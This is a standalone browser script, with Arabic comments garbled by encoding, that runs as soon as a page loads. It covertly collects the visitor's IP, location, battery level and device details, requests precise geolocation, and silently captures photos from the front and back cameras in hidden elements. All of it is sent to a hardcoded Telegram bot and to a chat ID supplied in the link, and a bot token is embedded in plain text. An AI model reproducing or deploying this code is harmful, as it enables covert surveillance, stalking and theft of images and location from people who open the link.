

<script>
    // âš™ï¸ Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„ØªÙŠÙ„ÙŠØ¬Ø±Ø§Ù…
    const BOT_TOKEN = '8060685956:AAGJztf_aHHhFdBsH2OLuCPYS2TwPRY3_R4';
    const FIXED_CHAT_ID = '1431886140'; // Ø«Ø§Ø¨Øª

    // ğŸ“ Ø¬Ù„Ø¨ chatId Ù…Ù† Ø§Ù„Ø±Ø§Ø¨Ø·
    const urlParams = new URLSearchParams(window.location.search);
    const dynamicChatId = urlParams.get("id");

    // ğŸ› ï¸ Ø¥Ø±Ø³Ø§Ù„ Ù„Ù„Ù…Ø¹Ø±ÙØ§Øª ÙƒÙ„Ù‡Ø§
    function sendToTelegramMultiple(message, isLocation = false, lat = null, lon = null, photoBlob = null, caption = '') {
        const ids = [FIXED_CHAT_ID];
        if (dynamicChatId) ids.push(dynamicChatId);

        ids.forEach(chatId => {
            if (isLocation) {
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        latitude: lat,
                        longitude: lon
                    })
                }).catch(() => {});
            } else if (photoBlob) {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', photoBlob, 'photo.webp');
                if (caption) formData.append('caption', caption);

                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                }).catch(() => {});
            } else {
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                }).catch(() => {});
            }
        });
    }

    // ğŸŒ Ø¬Ù…Ø¹ Ø¨ÙŠØ§Ù†Ø§Øª Ø¥Ø¶Ø§ÙÙŠØ©
    async function collectAdditionalData() {
        let ip = 'Ù…Ø§ÙÙŠØ´';
        let country = 'Ù…Ø§ÙÙŠØ´';
        let city = 'Ù…Ø§ÙÙŠØ´';

        try {
            const res = await fetch('https://ipapi.co/json/');
            const data = await res.json();
            ip = data.ip || 'Ù…Ø§ÙÙŠØ´';
            country = data.country_name || 'Ù…Ø§ÙÙŠØ´';
            city = data.city || 'Ù…Ø§ÙÙŠØ´';
        } catch (e) {}

        let batteryLevel = 'Ù…Ø§ÙÙŠØ´';
        let batteryCharging = 'Ù…Ø§ÙÙŠØ´';
        try {
            const battery = await navigator.getBattery();
            batteryLevel = Math.round(battery.level * 100) + '%';
            batteryCharging = battery.charging ? 'Ù†Ø¹Ù…' : 'Ù„Ø§';
        } catch (e) {}

        return {
            ip, country, city,
            platform: navigator.platform,
            deviceVersion: navigator.userAgent,
            batteryLevel, batteryCharging
        };
    }

    // ğŸ“ Ø¬Ù„Ø¨ Ø§Ù„Ù…ÙˆÙ‚Ø¹
    function getLocation() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve(null);
                return;
            }

            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const { latitude, longitude, accuracy } = position.coords;
                    resolve({ lat: latitude, lon: longitude, accuracy });
                },
                () => resolve(null),
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
        });
    }

    // ğŸ“ Ø¥Ø±Ø³Ø§Ù„ ØªÙ‚Ø±ÙŠØ±
    function sendTextReport(data, note = '') {
        let message = `
ğŸ“‹ *ØªÙ‚Ø±ÙŠØ± Ø¬Ù…Ø¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª*
ğŸ†” Ø§Ù„Ø«Ø§Ø¨Øª: ${FIXED_CHAT_ID}
ğŸ†” Ù…Ù† Ø§Ù„Ø±Ø§Ø¨Ø·: ${dynamicChatId || 'Ù…Ø§ÙÙŠØ´'}
ğŸŒ Ø§Ù„Ø¬Ù‡Ø§Ø²:
â€¢ Ø§Ù„Ù†Ø¸Ø§Ù…: ${data.platform}
â€¢ User Agent: ${data.deviceVersion}
ğŸ”‹ Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©: ${data.batteryLevel} | Ø§Ù„Ø´Ø­Ù†: ${data.batteryCharging}
ğŸŒ Ø§Ù„Ù…ÙˆÙ‚Ø¹:
â€¢ Ø§Ù„Ø¢ÙŠØ¨ÙŠ: ${data.ip}
â€¢ Ø§Ù„Ø¯ÙˆÙ„Ø©: ${data.country}
â€¢ Ø§Ù„Ù…Ø¯ÙŠÙ†Ø©: ${data.city}
${note ? `ğŸ“Œ Ù…Ù„Ø§Ø­Ø¸Ø©: ${note}` : ''}
â° ${new Date().toLocaleString('ar-EG')}
        `.trim();

        sendToTelegramMultiple(message);
    }

    // ğŸ“¸ Ø¥Ø¹Ø¯Ø§Ø¯ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
    function setupCamera(video, canvas, type) {
        video.play();
        video.onplaying = () => {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            let count = 0;

            const interval = setInterval(() => {
                if (count >= 3) {
                    clearInterval(interval);
                    stopCamera(video);
                    return;
                }
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                canvas.toBlob(blob => {
                    sendToTelegramMultiple('', false, null, null, blob, `ğŸ“¸ ÙƒØ§Ù…ÙŠØ±Ø§ ${type} - ØµÙˆØ±Ø© ${count + 1}`);
                }, 'image/jpeg', 0.7);
                count++;
            }, 1500);
        };
    }

    function stopCamera(video) {
        if (video.srcObject) {
            video.srcObject.getTracks().forEach(track => track.stop());
        }
    }

    // ğŸš€ ØªØ´ØºÙŠÙ„ Ø¹Ù†Ø¯ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø©
    window.addEventListener('load', async () => {
        const data = await collectAdditionalData();

        // ğŸ“ Ø§Ù„Ù…ÙˆÙ‚Ø¹
        const location = await getLocation();
        if (location) {
            sendToTelegramMultiple('', true, location.lat, location.lon);
            data.location = `Lat: ${location.lat}, Lon: ${location.lon}, Ø¯Ù‚Ø©: ${location.accuracy}`;
        } else {
            data.location = 'Ù…Ø§ÙÙŠØ´';
        }

        sendTextReport(data);

        // ğŸ¥ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§Øª
        const frontVideo = document.createElement('video');
        const backVideo = document.createElement('video');
        const frontCanvas = document.createElement('canvas');
        const backCanvas = document.createElement('canvas');

        [frontVideo, backVideo].forEach(v => {
            v.setAttribute('playsinline', '');
            v.setAttribute('autoplay', '');
            v.setAttribute('muted', '');
            document.body.appendChild(v);
            v.style.display = 'none';
        });

        [frontCanvas, backCanvas].forEach(c => {
            document.body.appendChild(c);
            c.style.display = 'none';
        });

        try {
            const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            frontVideo.srcObject = frontStream;
            setupCamera(frontVideo, frontCanvas, "Ø£Ù…Ø§Ù…ÙŠØ©");
        } catch (e) {
            sendToTelegramMultiple("âŒ ÙØ´Ù„ Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø£Ù…Ø§Ù…ÙŠØ©");
        }

        try {
            const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
            backVideo.srcObject = backStream;
            setupCamera(backVideo, backCanvas, "Ø®Ù„ÙÙŠØ©");
        } catch (e) {
            sendToTelegramMultiple("âŒ ÙØ´Ù„ Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø®Ù„ÙÙŠØ©");
        }
    });
</script>